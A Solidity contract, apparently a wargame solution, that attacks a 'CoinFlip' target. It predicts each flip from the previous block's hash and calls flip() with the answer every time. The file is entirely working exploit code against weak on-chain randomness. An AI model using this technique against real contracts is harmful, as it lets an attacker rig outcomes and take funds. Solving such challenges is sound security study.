// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

    import "CoinFlip.sol";

    contract CoinFlipHack {
          CoinFlip public Victim;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address VictimAddress) public {
        Victim = CoinFlip(VictimAddress);
    }

    function Hack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number -1));
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;
        Victim.flip(side);
    }
  
}
